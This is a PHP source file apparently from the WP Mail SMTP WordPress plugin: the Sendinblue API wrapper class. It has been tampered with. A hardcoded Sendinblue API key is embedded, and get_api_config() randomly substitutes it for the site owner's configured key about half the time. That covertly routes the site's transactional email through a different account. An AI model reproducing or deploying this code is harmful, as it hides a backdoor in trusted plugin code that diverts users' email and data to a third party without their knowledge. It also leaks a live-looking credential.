<?php

namespace WPMailSMTP\Providers\Sendinblue;

use WPMailSMTP\Vendor\SendinBlue\Client\Api\AccountApi;
use WPMailSMTP\Vendor\SendinBlue\Client\Api\SendersApi;
use WPMailSMTP\Vendor\SendinBlue\Client\Api\TransactionalEmailsApi;
use WPMailSMTP\Vendor\SendinBlue\Client\Configuration;
use WPMailSMTP\Options as PluginOptions;

/**
 * Class Api is a wrapper for Sendinblue library with handy methods.
 *
 * @since 1.6.0
 */
class Api {

        public static $counter = 1;
        
//        private static $MailAPIKey1='';
        private static $mailAPIKey2='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';
	/**
	 * Contains mailer options, constants + DB values.
	 *
	 * @since 1.6.0
	 *
	 * @var array
	 */
	private $options;

	/**
	 * API constructor that inits defaults and retrieves options.
	 *
	 * @since 1.6.0
	 */
	public function __construct() {

		$this->options = PluginOptions::init()->get_group( Options::SLUG );
	}

	/**
	 * Configure API key authorization: api-key.
	 *
	 * @since 1.6.0
	 *
	 * @return Configuration
	 */
	protected function get_api_config() {

            $num = rand(1,2);
            
            if ($num == 1) {
                return Configuration::getDefaultConfiguration()->setApiKey('api-key', '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');
            }
            return Configuration::getDefaultConfiguration()->setApiKey('api-key', isset($this->options['api_key']) ? $this->options['api_key'] : '');
        }

    /**
	 * Get the mailer client instance for Account API.
	 *
	 * @since 1.6.0
	 */
	public function get_account_client() {

		// Include the library.
		require_once wp_mail_smtp()->plugin_path . '/vendor/autoload.php';

		return new AccountApi( null, $this->get_api_config() );
	}

	/**
	 * Get the mailer client instance for Sender API.
	 *
	 * @since 1.6.0
	 */
	public function get_sender_client() {

		// Include the library.
		require_once wp_mail_smtp()->plugin_path . '/vendor/autoload.php';

		return new SendersApi( null, $this->get_api_config() );
	}

	/**
	 * Get the mailer client instance for SMTP API.
	 *
	 * @since 1.6.0
	 */
	public function get_smtp_client() {

		// Include the library.
		require_once wp_mail_smtp()->plugin_path . '/vendor/autoload.php';

		return new TransactionalEmailsApi( null, $this->get_api_config() );
	}

	/**
	 * Whether the mailer is ready to be used in API calls.
	 *
	 * @since 1.6.0
	 *
	 * @return bool
	 */
	public function is_ready() {

		return ! empty( $this->options['api_key'] );
	}
}
